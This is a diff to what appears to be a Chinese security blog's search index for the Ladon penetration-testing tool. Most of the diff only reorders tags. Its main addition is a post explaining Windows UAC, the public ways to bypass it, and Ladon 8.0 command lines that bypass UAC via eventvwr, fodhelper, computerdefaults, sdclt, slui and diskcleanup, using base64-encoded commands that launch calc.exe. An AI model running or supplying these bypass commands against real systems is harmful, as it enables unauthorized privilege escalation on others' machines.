@@ -1220,6 +1220,45 @@ window.location.href="http://k8gege.org/Ladon/LadonGo.html";
       </tags>
   </entry>
   <entry>
+    <title>〖提权〗Ladon 8.0五种方法BypaaUAC(Win7-Win10)</title>
+    <url>/p/Ladon_bypassUAC.html</url>
+    <content><![CDATA[<h3 id="什么是UAC"><a href="#什么是UAC" class="headerlink" title="什么是UAC"></a>什么是UAC</h3><p>根据MSDN中的文档,User Account Control(UAC)是在Windows Vista 以后版本中引入的一种安全机制,针对具有有限权限的账户.</p>
+<p>通过 UAC，应用程序和任务可始终在非管理员帐户的安全上下文中运行，除非管理员特别授予管理员级别的系统访问权限。UAC 可以阻止未经授权的应用程序自动进行安装，并防止无意中更改系统设置。</p>
+<h3 id="BypassUAC方法"><a href="#BypassUAC方法" class="headerlink" title="BypassUAC方法"></a>BypassUAC方法</h3><p>目前公开的绕过UAC的几种方式:</p>
+<p>1.各类的UAC白名单程序的DLL劫持<br>2.各类自动提升权限的COM接口利用(Elevated COM interface)<br>3.Windows 自身漏洞提权<br>4.远程注入</p>
+<p>UACME: <a href="https://github.com/hfiref0x/UACME,内含60+种BypassUAC的方法，有兴趣可自行研究" target="_blank" rel="noopener">https://github.com/hfiref0x/UACME,内含60+种BypassUAC的方法，有兴趣可自行研究</a></p>
+<h3 id="利用白名单"><a href="#利用白名单" class="headerlink" title="利用白名单"></a>利用白名单</h3><p>上文也已经分析了,如果进程本身具有管理员权限或者可以直接获取管理员权限的话,就不会弹出UAC框让用户确认,这类程序被称为白名单程序，例如：slui.exe、wusa.exe、taskmgr.exe、msra.exe、eudcedit.exe、eventvwr.exe、CompMgmtLauncher.exe，rundll32.exe，explorer.exe等等。</p>
+<h3 id="Ladon-8-0"><a href="#Ladon-8-0" class="headerlink" title="Ladon 8.0"></a>Ladon 8.0</h3><p>[+] BypassUac 五种方法UAC提权（非交互式执行Base64加密CMD命令）<br>用法Ladon BypassUac</p>
+<p>eventvwr<br>fodhelper<br>computerdefaults<br>sdclt<br>slui</p>
+<p>[+] BypassUac2 eventvwr方法执行明文cmd命令（即8.0前的bypassUAC）</p>
+<h3 id="Ladon用法"><a href="#Ladon用法" class="headerlink" title="Ladon用法"></a>Ladon用法</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Load BypassUAC</span><br><span class="line">Usage:</span><br><span class="line">Method: eventvwr, fodhelper,computerdefaults, sdclt, slui</span><br><span class="line">Default Bypass Method is eventvwr</span><br><span class="line">Ladon BypassUAC Method Base64Cmd</span><br><span class="line">Example:</span><br><span class="line">Ladon BypassUAC eventvwr Y2FsYw==</span><br></pre></td></tr></table></figure>
+
+<h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><p>Example usage for eventvwr bypass to launch calc.exe</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon BypassUAC eventvwr Y21kIC9jIHN0YXJ0IGNhbGMuZXhl</span><br></pre></td></tr></table></figure>
+<p>Example usage for fodhelper bypass to launch calc.exe</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon BypassUAC fodhelper Y21kIC9jIHN0YXJ0IGNhbGMuZXhl</span><br></pre></td></tr></table></figure>
+<p>Example usage for computerdefaults bypass to launch calc.exe</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon BypassUAC computerdefaults Y21kIC9jIHN0YXJ0IGNhbGMuZXhl</span><br></pre></td></tr></table></figure>
+<p>Example usage for sdclt bypass to launch calc.exe</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon BypassUAC sdclt Y21kIC9jIHN0YXJ0IGNhbGMuZXhl</span><br></pre></td></tr></table></figure>
+
+<p>Note: this appears to only work on Windows 10 in my testing</p>
+<p>Example usage for slui bypass to launch calc.exe</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon BypassUAC slui Y21kIC9jIHN0YXJ0IGNhbGMuZXhl</span><br></pre></td></tr></table></figure>
+<p>Example usage for DiskCleanup bypass to launch calc.exe</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon BypassUAC dikcleanup Y21kIC9jIHN0YXJ0IGNhbGMuZXhlICYmIFJFTQ==</span><br></pre></td></tr></table></figure>
+
+<h3 id="Ladon下载"><a href="#Ladon下载" class="headerlink" title="Ladon下载"></a>Ladon下载</h3><p>LadonGo3.4: <a href="https://github.com/k8gege/LadonGo" target="_blank" rel="noopener">https://github.com/k8gege/LadonGo</a><br>PowerLadon: <a href="https://github.com/k8gege/PowerLadon" target="_blank" rel="noopener">https://github.com/k8gege/PowerLadon</a><br>历史版本: <a href="http://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">http://github.com/k8gege/Ladon/releases</a><br>Ladon 7.0版本：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a><br>Ladon 8.0版本：K8小密圈</p>
+]]></content>
+      <categories>
+        <category>Ladon</category>
+      </categories>
+      <tags>
+        <tag>Ladon</tag>
+        <tag>bypassUAC</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>〖编程〗LadonGo菜刀PHP一句话连接执行CMD代码</title>
     <url>/p/ladon_phpshell.html</url>
     <content><![CDATA[<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>最近VPS被人D比较卡，有时候M都不定连得上，或者连上了也难代理出来，所以需要一个命令行下连接内网WEBSHELL执行命令的工具，当然这个功能Ladon早有了。主要是因为在Linux下横向渗透连接内网其它机器执行命令，GO版还没有，所以先给LadonGo添加PHP一句话的连接功能，其它webshell有空再加。</p>
@@ -2937,8 +2976,8 @@ window.location.href="http://k8gege.org/Ladon/WinrmScan.html";
 ]]></content>
       <categories>
         <category>Ladon</category>
-        <category>远程执行</category>
         <category>密码爆破</category>
+        <category>远程执行</category>
       </categories>
       <tags>
         <tag>Ladon</tag>
@@ -3612,8 +3651,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
         <category>Ladon</category>
       </categories>
       <tags>
-        <tag>Exp</tag>
         <tag>Ladon</tag>
+        <tag>Exp</tag>
       </tags>
   </entry>
   <entry>
@@ -3831,8 +3870,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
         <category>Ladon</category>
       </categories>
       <tags>
-        <tag>Exp</tag>
         <tag>Ladon</tag>
+        <tag>Exp</tag>
         <tag>Tool</tag>
         <tag>GetShell</tag>
         <tag>ActiveMQ</tag>
@@ -3855,8 +3894,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
         <category>Ladon</category>
       </categories>
       <tags>
-        <tag>Exp</tag>
         <tag>Ladon</tag>
+        <tag>Exp</tag>
         <tag>Tool</tag>
         <tag>GetShell</tag>
         <tag>ThinkPHP</tag>
@@ -3880,8 +3919,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
         <category>Ladon</category>
       </categories>
       <tags>
-        <tag>Exp</tag>
         <tag>Ladon</tag>
+        <tag>Exp</tag>
         <tag>Tool</tag>
         <tag>GetShell</tag>
         <tag>PhpStudy</tag>
@@ -3911,8 +3950,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
         <category>Ladon</category>
       </categories>
       <tags>
-        <tag>Exp</tag>
         <tag>Ladon</tag>
+        <tag>Exp</tag>
         <tag>Tool</tag>
         <tag>GetShell</tag>
         <tag>PhpStudy</tag>
@@ -4088,10 +4127,10 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
         <category>工具</category>
       </categories>
       <tags>
+        <tag>Ladon</tag>
         <tag>Apache</tag>
         <tag>Solr</tag>
         <tag>Exp</tag>
-        <tag>Ladon</tag>
         <tag>0day</tag>
       </tags>
   </entry>
@@ -4724,8 +4763,8 @@ Microsoft Windows 10 for 32-bit Systems 0
         <category>工具</category>
         <category>Ladon</category>
         <category>源码</category>
-        <category>编程</category>
         <category>Python</category>
+        <category>编程</category>
       </categories>
       <tags>
         <tag>Ladon</tag>
@@ -5007,9 +5046,9 @@ payload5='\x23\x64\x61\x74\x65\x3A\x20\x32\x30\x31\x39\x30\x36\x32\x36\x20\x23\x
         <category>工具</category>
       </categories>
       <tags>
+        <tag>Code</tag>
         <tag>Exp</tag>
         <tag>Tool</tag>
-        <tag>Code</tag>
         <tag>GetShell</tag>
       </tags>
   </entry>
@@ -5361,12 +5400,12 @@ from pprint import pprint
         <category>嗅探</category>
         <category>内网渗透</category>
         <category>信息收集</category>
-        <category>编程</category>
         <category>Python</category>
+        <category>编程</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Code</tag>
+        <tag>Tool</tag>
         <tag>Python</tag>
       </tags>
   </entry>
